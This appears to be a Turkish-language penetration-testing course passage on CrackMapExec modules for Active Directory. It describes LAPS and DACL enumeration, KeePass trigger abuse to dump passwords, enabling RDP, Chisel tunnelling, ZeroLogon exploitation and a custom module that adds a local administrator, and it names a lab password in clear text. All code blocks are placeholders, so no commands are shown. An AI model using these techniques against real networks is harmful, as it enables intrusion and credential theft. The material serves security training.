{{CODE_BLOCK_193}}


Not: Tüm CrackMapExec seçenekleri BloodHound veritabanı ile senkronize olmayacaktır. Örneğin, `--ntds` veya `--lsa` seçeneklerini denersek, kullanıcıları veritabanında sahip olunan olarak işaretlemez, ancak `procdump` veya `lsassy` gibi modüller kullanıcıları sahip olunan olarak işaretler.


### BloodHound'da Bilgisayarları Owned Olarak Ayarlama

Yazım sırasında, BloodHound entegrasyonu yalnızca user'ları Owned olarak işaretlemektedir. Bir `computer` owned olarak işaretlemek istiyorsak, `bh_owned` modülünü ve `neo4j` veritabanımızın kullanıcı adı ve şifresini kullanabiliriz. Aşağıdaki örnekte, diğer varsayılan değerler neo4j veritabanımızla eşleştiği için yalnızca `PASS` seçeneğini ekleyeceğiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, büyük ağlarla uğraşırken birçok seçenek sunar ve müşterilerimizle paylaşmak istememiz durumunda veritabanını güncellemenin hızlı bir yoludur. Bir sonraki bölümde, CrackMapExec'te mevcut olan bazı popüler modüllerle çalışacağız.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici şeylerden biri, modüler olması ve herkesin modüller oluşturmasına ve bunları araca katkıda bulunmasına izin vermesidir. CrackMapExec, exploit ve exploit sonrası görevleri kolaylaştırmak için işlemler gerçekleştirmemizi sağlayan 50'den fazla modüle sahiptir. Bu bölümde LDAP ve SMB protokolleri için bu modüllerden bazıları incelenecektir.


### LDAP Protocol Modules

LDAP protokolü yaygın olarak Domain Controller'lar ile etkileşime geçmemizi ve onlardan bilgi almamızı sağlar. Active Directory'den ilginç bilgiler çıkarmamızı sağlayacak bazı modülleri gözden geçirelim.


### **LDAP Module - get-network**

`get-network` modülü [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'ı  temel alır. Varsayılan olarak, Active Directory'deki herhangi bir kullanıcı, `zone transferine` benzer şekilde Domain veya Forest DNS bölgelerindeki tüm DNS kayıtlarını numaralandırabilir. Bu araç, internal ağların yeniden yapılandırılması amacıyla bölgedeki tüm DNS kayıtlarının numaralandırılmasını ve dışa aktarılmasını sağlar.

Modülü kullanmanın üç (3) yolu vardır:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adları).

Varsayılan olarak, herhangi bir seçenek belirtmezsek, modül yalnızca IP adresini alacaktır. `ALL=true` seçeneğini seçersek, hem IP hem de domain adlarını alır ve `ONLY_HOSTS=true` olarak belirtirsek, yalnızca FQDN'yi alırız.


### DNS Sunucusundan (Record) Kayıtları Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazının yazıldığı zamanda, modül **`adidnsdump`** aracıyla bazı farklılıklar göstermektedir. Sonuçlar, hesaplar arasında farklılık gösterebilir.


### LDAP Module - laps

Bir başka harika modül de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e bağlı bilgisayarlarda local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL'ler tarafından korunur, böylece yalnızca belirli kullanıcılar bunları okuyabilir veya `parola sıfırlama` talebinde bulunabilir. Laps modülü ile bir hesabın okuma erişimine sahip olduğu tüm bilgisayarları alabiliriz. Bir bilgisayarı belirtmek için `COMPUTER` seçeneğini de kullanabilir veya benzer ada sahip birkaç bilgisayarı almak için bir wildcard karakterle birlikte kullanabiliriz.


### LAPS Modülü Parolaların Alınması

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: Kullanılan parola bir örnektir. Hedef hostta çalışmayacaktır

### LDAP Modülü - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'ü ile temsil edilen ve varsayılan olarak bir **user**'ın bir **domain** içinde oluşturabileceği **computer account** sayısını belirten bir **domain level attribute**'tür.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazı **attack** senaryolarında **domain** içinde bir **machine** oluşturmak gerekebilir, bu yüzden **account machine quota attribute**'ünü **enumerate** etmek önemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir başka harika modül ise bir veya birden fazla object'in `DACL`'lerini okumamızı ve dışa aktarmamızı sağlayan `daclread`'dir. Bu modül Active Directory erişimini numaralandırmamızı sağlayacaktır. Aşağıdaki seçeneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabının tüm **ACE**'lerini okumak istiyoruz. Bunun için **`TARGET`** seçeneğini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace Kullanıcısının DACL'sini Oku

{{CODE_BLOCK_203}}


Ayrıca belirli hakları da arayabiliriz, örneğin hangi **principal**'ların **DCSync** haklarına sahip olduğunu. Bunun için **`TARGET_DN`** seçeneğini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seçeneğini seçmemiz ve aramak istediğimiz hakları **`RIGHTS`** seçeneğiyle belirlememiz gerekir.

### DCSync Rights'a Sahip Kullanıcıları Arama

{{CODE_BLOCK_204}}



Çıktıda gösterildiği gibi, `ACE[4]` `robert` kullanıcısının hedef domain'de `DCSync` haklarına sahip olduğunu gösterir.

LDAP'ta birkaç modül daha kullanabiliriz. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolünde daha fazla modül mevcuttur. CrackMapExec modülünde yaptığımız şeylerin çoğu SMB protokolünü kullanır. İlginç bilgiler elde etmemizi sağlayacak bazı modülleri gözden geçirelim.

Not: SMB kullanan modüllerin çoğunun çalışması için admin haklarına ( `Pwned!` ) ihtiyaç vardır.


### SMB Modülleri - get_netconnections ve ioxidresolver

Bir ağ pentesti üzerinde çalışırken, sürekli olarak daha fazla kaynağa veya ağa erişim elde etmeye çalışırız. CrackMapExec, daha önce tehlikeye attığımız bir makineyi numaralandırmamıza ve birden fazla ağ yapılandırmasına sahip olup olmadığını belirlememize olanak tanıyan bazı modüllere sahiptir. `get_netconnections` ve `ioxidresolver` modüllerini kullanalım ve farklarını görelim.

`get_netconnections` modülü, ağ bağlantılarını sorgulamak için `WMI` kullanır. `IPv6` ve herhangi bir ikincil IP dahil olmak üzere tüm IP adreslerinin yanı sıra domain adını da alır.


### get_netconnections Module

{{CODE_BLOCK_206}}


Öte yandan, `ioxidresolver` modülü IP adreslerini sorgulamak için RPC kullanır. Ancak, bu modül `IPv6` adreslerini içermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: İhtiyaçlarımıza en uygun olanı seçebilmemiz için bir modülün nasıl çalıştığını anlamak önemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal ağlarda adminler ve kullanıcılar tarafından parolaları ve gizli bilgileri tek bir veritabanında saklamak için yaygın olarak kullanılan ücretsiz, açık kaynaklı bir password manager'dır. Bir master password onu korur. Bir KeePass veritabanı alırsak, onu açmak için şifresine ihtiyacımız vardır.

### KeePass'i Keşfetme

{{CODE_BLOCK_208}}

Eğer master parolaya sahip değilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafından geliştirilen ve veritabanını açık metin olarak dışa aktarmak için KeePass'ın triger sistemini kullanan bir teknik kullanmaktır. KeePass yapılandırma dosyasını, veritabanını otomatik olarak açık metin olarak dışa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) içerecek şekilde değiştirir.

Bunu kullanmak için beş (5) adıma ihtiyacımız var:

*  KeePass yapılandırma dosyasını bulun. Biz bunu `keepass_discover` modülü ile yaptık.
 * `ACTION=ADD` seçeneğini ve `KEEPASS_CONFIG_PATH` öğesini kullanarak trigger'ı yapılandırma dosyasına ekleyin.

### KeePass Yapılandırma Dosyasına Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapılandırma yolu için ters eğik çizgi (`/`) veya çift eğik çizgi (`\`) kullandığınızdan emin olun.

* Kullanıcının KeePass'i açmasını ve master parolayı girmesini bekleyin. Bu işlemi zorlamak için `ACTION=RESTART` seçeneğini kullanarak KeePass.exe prosesini yeniden başlatabiliriz. Hedef makinede oturum açmış çok sayıda kullanıcı varsa, `USER=julio` gibi kullanıcı adı ile `USER` seçeneğini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seçeneğini kullanarak export edilen veritabanını makinemize sorgulayın. Daha sonra şifre girişlerini aramak için grep kullanabiliriz.


### Ele Geçirilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seçeneğini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapılandırma dosyasını temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modülün her seçeneğini öğrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seçeneğin iyi yanı, **extract_password** yöntemini de içermesidir; bu yöntem **.xml** dosyasında herhangi bir parola girişini arar ve konsola yazdırır.


### keeppass_trigger TÜMÜNÜ Tek Komutta Çalıştırma

{{CODE_BLOCK_214}}

Not: Modül şifreyi yazdırırken sorun yaşayabilir. Bir hata alabiliriz, ancak şifre `/tmp/export.xml` dosyasında olacaktır, böylece manuel olarak alabiliriz.

### RDP'yi Etkinleştirme veya Devre Dışı Bırakma

Değerlendirme yaparken yapmak isteyebileceğimiz yaygın bir görev, RDP aracılığıyla bir hedef makineye bağlanmaktır. Bu, başka türlü lateral hareket saldırıları gerçekleştiremediğimiz veya standart bir protokol kullanarak radarın altından geçmek istediğimiz bazı senaryolarda yararlı olabilir.

Bağlanmak istediğimiz makinede RDP etkin değilse, buna izin vermek için RDP modülünü kullanabiliriz. `ACTION` seçeneğini ve ardından `enable` veya `disable` seçeneklerini belirtmemiz gerekir.


### RDP'yi Etkinleştirme

{{CODE_BLOCK_215}}


SMB'de birkaç modül daha vardır. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bölümde, ZeroLogon gibi bilinen güvenlik açıklarından yararlanan diğer SMB modüllerine bakacağız

### Vulnerability Scan Modules

Sızma testi yaparken gerçekleştirdiğimiz günlük faaliyetlerden biri güvenlik açıklarını tespit etmeye çalışmaktır. Eğer herhangi birini bulabilirsek, exploitation işi basit olabilir.

CrackMapExec, güvenlik açıklarını tespit etmemizi sağlayan bazı modüller içerir. Bu oturumda bunlardan bazılarını inceleyeceğiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geçirdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki ağ kartı var ve amacımız domainin saldırıya karşı savunmasız olup olmadığını belirlemek. Domainin IP adresi `172.16.10.3`'tür.

Domain'e erişim sağlamak için, CME ile ProxyChain bölümünde öğrendiklerimizi kullanacağız ve Chisel ile bir bağlantı kuracağız


### Chisel'i Hedef Makineye Gönderme

{{CODE_BLOCK_217}}


### Saldırı Hostumuzda Chisel'ı Sunucu Olarak Çalıştırma

{{CODE_BLOCK_218}}


### Chisel'ı Tehlikeye Düşmüş Cihazdan Saldırı Hostumuza Bağlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki güvenlik açığı modüllerinin çoğu yalnızca kontrol edilir ve bu modülleri güvenlik açıklarından yararlanmak için kullanamayız. [ZeroLogon güvenlik açığı](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile başlayalım.


### ZeroLogon

Kimliği doğrulanmamış bir saldırgan, bir domain controller'a ağ erişimi ile[ ZeroLogon güvenlik açığından (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu güvenlik açığını kötüye kullanmak ve sonunda domain'in controller'ı ele geçirmek için savunmasız bir Netlogon session'ı başlatması gerekir. Bir Domain Controller'a bağlanmak başarılı bir saldırı için tek ön koşul olduğundan, güvenlik açığı ciddidir.

CrackMapExec, bir Domain Controller'ın ZeroLogon'a karşı savunmasız olup olmadığını tanımlayan zerologon adlı bir modül içerir.


### ZeroLogon Güvenlik Açığı Kontrolü

{{CODE_BLOCK_220}}


### PetitPotam

Güvenlik araştırmacısı [Gilles Lionel](https://twitter.com/topotam77) kısa bir süre önce [PetitPotam](https://github.com/topotam/PetitPotam) adı verilen ve saldırganların sadece kurumsal ağ altyapısına erişim sağlayarak domain'i tehlikeye atmasına olanak tanıyan bir saldırı tekniğini ortaya çıkardı. Yöntem, sunulan herhangi bir sunucu servisine (örneğin bir Domain Controller) yönelik klasik bir `NTLM relay` saldırısıdır. Lionel ayrıca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldırganların domain'i ele geçirmek için bu özel saldırı tekniğini nasıl kullanabileceklerini gösteren bir proof of  concept kodu da yayınladı.

CrackMapExec, bir Domain Controller'ın PetitPotam'a karşı savunmasız olup olmadığını tanımlayan `petitpotam` adlı bir modül içerir.


### Petitpotam Güvenlik Açığı Kontrolü

{{CODE_BLOCK_221}}


### noPAC

noPAC güvenlik açığının exploit'i, normal bir domain kullanıcısının ayrıcalıklarının bir domain admin yükseltilmesine izin verdi. Kavram kanıtı (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayınlandı.

CrackMapExec, bir domain controller'ın noPAC'a karşı savunmasız olup olmadığını tanımlayan nopac adlı bir modül içerir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlı bir NTLM relay saldırısı için bir kavram kanıtı ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayınladı. Yöntem, bir Windows domain'inin controller'ı ele geçirmek için Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolünü ele geçiriyor.

Bu saldırı bir domain kullanıcısı gerektirir ve bir DC'nin savunmasız olup olmadığını belirlemek için CrackMapExec modülü `dfscoerce`'yi kullanabiliriz. Bu güvenlik açığını kontrol etmek için `Y3t4n0th3rP4ssw0rd` şifresiyle `carole.holmes` hesabını kullanacağız.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, güvenlik araştırmacısı Lionel Gilles tarafından 2021'in sonlarında PetitPotam saldırısını sergileyen bir sunumun sonunda keşfedildi ve ilk kez detaylandırıldı. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanıtı ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluşturdu.

CrackMapExec modülü shadowcoerce kullanarak DC'nin bu saldırıya karşı savunmasız olup olmadığını kontrol etmek için carole.holmes hesabını kullanalım.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


Güvenlik açığı tarama modüllerinin çoğu yazarı, bilgisayarın güvenlik açığı olup olmadığına dair bir mesaj eklememiştir, bu nedenle komut çalıştırıldıktan sonra hiçbir şey görmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modülünün kaynak kodunu kontrol edersek, yazarın ( `logging.debug` ) ile bazı debug log'ları eklediğini göreceğiz. CrackMapExec'i hata debug modunda çalıştırırsak, bu logları yazdıracaktır.

CrackMapExec'i debug modunda çalıştırmak için protokolden önce `--verbose` seçeneğini kullanabiliriz


### shadowcoerce Modülünü Verbose Enabled ile Çalıştırma

{{CODE_BLOCK_225}}


`DEBUG` ile başlayan satırlar `logging.debug`'a karşılık gelir. Son satırlarda hedefin savunmasız olmadığını gösterdiğini görebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diğer adıyla EternalBlue, Windows işletim sistemleri için Microsft tarafından 14 Mart 2017 tarihinde yayınlanan bir güvenlik yamasıdır. Yama, SMB servisindeki kritik bir kimliği doğrulanmamış remote kod çalıştırma açığı içindir. Bu güvenlik açığı hakkında daha fazla bilgi edinmek için [Microsoft Güvenlik Bülteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'ın MS17-010'a karşı savunmasız olup olmadığını belirleyen ms17-010 adlı bir modül içerir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### Güvenlik Açığından Yararlanma

Birçok güvenlik açığı gördük. Onlardan birini exploit etmeye çalışalım: ZeroLogon. Modül tarafından sağlanan bağlantıya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalım:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geçtikçe yeni güvenlik açıkları ortaya çıkacaktır ve bunlar sektör uzmanları veya bizim tarafımızdan CrackMapExec'e modül olarak eklenebilir. Bir sonraki bölümde, CrackMapExec için nasıl bir modül oluşturabileceğimizi göreceğiz.

---

### Kendi CME Modülümüzü Oluşturmak

Yazarlar ve topluluk tarafından oluşturulan birçok yerleşik CrackMapExec modülünü kullandık. Bu bölümde CrackMapExec için modülümüzü nasıl yapabileceğimizi keşfedeceğiz.


### CrackMapExec'i Poetry ile derleyin

Modülümüzü oluşturmadan önce, CrackMapExec projesinin nasıl derleneceğini bilmek çok önemlidir. Bu amaçla CME, projelerimizi oluştururken önerilen [Poetry](https://python-poetry.org/)'yi kullanır. Poetry kullanmıyorsanız, CrackMapExec'i çalıştırmak üzere Poetry kullanmaya başlamak için Kurulum ve Binaryler bölümüne bir göz atın

Şimdi kodu en sevdiğimiz IDE ile açabiliriz. Bu bölümde [VSCode](https://code.visualstudio.com/) kullanacağız. VSCode'u [kurmak](https://code.visualstudio.com/download) için .deb dosyasını kendi web sitesinden indirmemiz gerekiyor. Doğrudan indirme bağlantısı [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un Kurulması ve Çalıştırılması

{{CODE_BLOCK_229}}

Daha sonra açmak için `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni Modülümüzü Oluşturun

Modülümüzü oluşturalım. Yeni bir administrator hesabı oluşturacak basit bir script oluşturacağız.

* ./CrackMapExec/cme/modules klasörü altında `createadmin.py` adında bir dosya oluşturun.
* Aşağıdaki kod örneğini dosyaya kopyalayın:

{{CODE_BLOCK_231}}



* Şimdi modülümüzü özelleştirelim.

Bazı değişkenleri tanımlamamız gerekiyor:

* `name`, modül adını nasıl çağıracağımızı belirtir. Bu durumda, `createadmin` dosya adını kullanacağız.
* `description` modülün amacı için kısa bir açıklamadır. Biz bunu `Create a new administrator account` ayarlayacağız.
* `supported_protocols`, modülü kullanmak için desteklenen protokolün bir dizisidir. Biz sadece `SMB` kullanacağız.
* `opsec_safe`, modülün çalıştırılmasının güvenli olduğu anlamına gelen bir `True` veya `False` değeridir.
* `multiple_hosts`, bu modülü birden fazla hedefe karşı çalıştırabileceğimiz anlamına gelir.

Ayrıca, modül için değişkenleri tanımlamak için kullanılan `options()` methoduna da sahip olacağız. Bu durumda, `USER` ve `PASS` olmak üzere iki seçenek ekleyeceğiz. Her seçeneğin varsayılan değeri olabilir ya da olmayabilir. Bu yazara bağlıdır. USER için varsayılan değeri düz metin olarak ve PASS için varsayılan değeri `asdasd123` . Ayrıca USER o PASS modül seçeneğinin boş olup olmadığını doğrulamak için bir kontrol ekledik. Eğer durum buysa, modülden çıkılacaktır.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile çalışacağız. Bu metot değişkenlerimizi almaktan ve hedeflere istediğimiz herhangi bir görevi yürütmekten sorumludur. Çıktı olarak `context.log.info` ve `context.log.highlight` metotlarını kullanacağız (farklı renklere sahipler).

Bu execute için, yöntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu çalıştıracağız. Komutumuz, yeni bir kullanıcı eklemek için `net user username password /add /Y` değeriyle ve kullanıcıyı administrators grubuna eklemek için `net localgroup administrators username /add` değeriyle command değişkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modülümüz şu şekilde görünmelidir:

{{CODE_BLOCK_234}}


### Modülümüzü Çalıştırma

Şimdi modülümüzü herhangi bir seçenekle veya herhangi bir seçenek olmadan çalıştırabiliriz. Önce varsayılan değerlerle çalıştırarak sonuçları görelim.


### CME Modülümüzün Çalıştırılması createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanıcı adı hem de parola belirterek çalıştırabiliriz.

{{CODE_BLOCK_236}}


İlk modülümüz çalışıyor, ancak çok daha iyi olabilir. Yürütmeyi iki komuta bölebilir ve kullanıcı zaten oluşturulmuşsa veya şifre politikalara uymuyorsa bir hata gösterebiliriz.

Ayrıca `context.log.highlight(p)`'den değeri alabilir ve bir hata varsa farklı bir şey gösterebiliriz. Bu kodu geliştirmek için fikirleriniz nelerdir?

### Diğer Yazarlardan Öğrenmek

Artık yeni bir modül oluşturmanın temellerini öğrendiğimize göre, diğer modülleri keşfetmeli ve birkaç fikir edinmeliyiz.

Örneğin, `procdump.py` modülü `procdump.exe` çalıştırılabilir dosyasını bir `Base64` string olarak kaydeder, ardından Base64 stringini bir dosyaya dönüştürür ve hedef işletim sisteminde tutar. LSASS'ın işlem kimliğini almak için `tasklist` komutunu çalıştırır, bunu bir değişkene kaydeder ve process kimliğini procdump.exe'nin yürütülmesine bir argüman olarak geçirir.

Başka bir örnek `get_description.py` . Bu modülü `groupmembership` modülünü oluşturmak için örnek olarak aldık. Bu modül, bir sorgu gerçekleştirmek ve `memberOf` attribute'unu almak için ihtiyaç duyduğumuz gibi, sonuçlarını bir LDAP sorgusuna dayalı olarak alır. Kodda bazı değişiklikler yaptık, yeni bir modül oluşturduk ve bir pull request gönderdik. Pull request kabul edildikten sonra tüm topluluk tarafından kullanılabilir olacaktır.

Yeni modüller oluşturmak için MSSQL gibi diğer protokoller için başka örneklere de bakabiliriz.


### Pull Request Oluşturma

CrackMapExec gibi bir proje topluluk tarafından canlı tutulur. Modülümüzün tüm topluluk tarafından kullanılabilir hale geleceği ve aracın kendisinin bir parçası olarak dahil edileceği bir pull request'i ekleyerek projeye katkıda bulunabiliriz.

Bir pull request'i yapmak için [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kılavuzunu takip edebilir ve CrackMapExec'e katkıda bulunabiliriz.

İlerleyen bölümlerde, CrackMapExec kullanımı için `IPv6`, `Kerberos Kimlik Doğrulama` ve `CrackMapExec` veritabanında uzmanlaşma gibi bazı bonus konuları tartışacağız.


### Ek CME İşlevselliği

CrackMapExec, çeşitli senaryolarda çok faydalı olacak başka yardımcı programlara da sahiptir. Bu bölümde, bunlardan üçünü inceleyeceğiz:

* Audit mode
* IPv6 desteği
* Birden fazla cihaza saldırırken tamamlanma yüzdesi

### Audit Mode

5.3.0 sürümünde yeni bir mod eklendi: `audit modu`. Bu mod, şifreyi veya hash'i tercih ettiğimiz bir karakterle veya hatta en sevdiğimiz `emoji` ile değiştirir. Bu özellik, bir müşteri raporu yazarken ekran görüntüsünün bulanıklaşmasını önlemeye yardımcı olur.

Audit modunu yapılandırmak için, varsayılan olarak `~/.cme/cme.conf` adresinde bulunan yapılandırma dosyasını düzenlememiz ve `audit_mode` parametresini tercih ettiğimiz karakterle değiştirmemiz gerekir. Bu karakter, CrackMapExec çalıştırılırken parolanın veya hash'in yerini alacaktır. Bu örnek için `#` karakterini kullanacağız


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Şimdi çalıştırabilir ve parolanın çıktıda `########` ile değiştirildiğini görebiliriz.

{{CODE_BLOCK_238}}

Gördüğümüz gibi, çalıştırma sonucundaki password `#` karakteri ile değiştirilir. Ancak, komut şifreyi gösterir. Bu gibi durumlarda, istenen komutu çalıştırmadan önce parolayı bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile Etkinleştirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diğer yeteneği, IPv6 üzerinden iletişimi desteklemesidir. Çoğu organizasyon, IPv6'yı varsayılan olarak etkinleştirmiştir, hatta bunu kullanmasalar bile, IPv6'nın log seviyesinde IPv4 kadar izlenmediği veya anlaşılmadığı durumlar da olabilir. Bu durum, ağ saldırılarının gerçekleştirilmesi ve tespit edilmeden geçmesi için bir fırsat yaratır.

Popüler modüller bölümünde gördüğümüz gibi, CrackMapExec, `get_netconnections` modülüyle bilgisayarların IPv6 adreslerini belirlememize olanak tanır. Bu modülü kullanarak IPv6 üzerinden komutu çalıştırmayı deneyelim.

### get_netconnections Modülünü Çalıştırma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Şimdi IPv6 üzerinden hedefe erişelim.

{{CODE_BLOCK_241}}



### Tamamlanma Yüzdesi

Artık bir tarama çalışırken enter tuşuna basabilirsiniz ve CME size tamamlanma yüzdesini ve taranacak kalan host sayısını verecektir. Bu modül laboratuvarında her seferinde bir host'a saldırıyoruz, ancak daha kapsamlı bir ağ bulduğunuzda, büyük olasılıkla bu özelliği kullanacaksınız. Şimdilik `--shares` seçeneğini çalıştıralım ve bitmeden önce enter tuşuna basalım.


### Tamamlanma Yüzdesi

{{CODE_BLOCK_242}}

Aşağıdaki bölümde, Kerberos kimlik doğrulamasını ve CrackMapExec'in bu kimlik doğrulama yöntemi için içerdiği yeni değişiklikleri tartışacağız.

---


### Kerberos Authentication

Yazma sırasında CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri için Kerberos Kimlik Doğrulamasını desteklemektedir. Kerberos Kimlik Doğrulamasını kullanmanın iki (2) yolu vardır:

* `ccache` dosyasını belirtmek için `KRB5CCNAME` env adını kullanma. 
* CrackMapExec 5.4.0'dan başlayarak, artık Kerberos kimlik doğrulaması için bir Ticketla `KRB5CCNAME` environment variable'ını kullanmamız gerekmiyor. Bir kullanıcı adı ve parola veya kullanıcı adı ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin `FQDN`'sini çözümlemesi gerektiğidir. İnternal bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve `/etc/hosts` dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi `Kerbrute`'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

{{CODE_BLOCK_246}}

Gördüğümüz gibi, `Kerbrute` CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, `asreproast` saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce `AESREPRoast` Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.

Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos logu etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.


### AES-128 veya AES-256 kullanma

Ayrıca, Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araçlar, genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullandığımızda, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve bu da operasyonel bir avantaj (opsec) sağlayacaktır. Hadi Secretsdump'u kullanalım ve ardından AES256 ile kimlik doğrulaması yapalım.


### AES256 ile Kimlik Doğrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle servislere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.

